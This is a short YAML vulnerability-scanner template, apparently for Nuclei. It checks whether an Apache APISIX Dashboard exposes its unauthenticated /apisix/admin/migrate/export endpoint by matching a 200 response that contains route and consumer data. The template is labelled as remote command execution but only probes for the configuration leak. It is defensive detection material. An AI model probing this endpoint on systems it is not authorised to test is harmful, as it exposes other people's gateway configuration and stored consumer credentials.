id: apache-apisix-dashboard-unauth
info:
  name: Apache APISIX Dashboard Unauthorized Remote Command Execution
  author: ProjectDiscoveryAI
  severity: critical
  tags: rce
http:
  - method: GET
    path:
      - "{{BaseURL}}/apisix/admin/migrate/export"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "\"Routes\":["
          - "\"Consumers\""
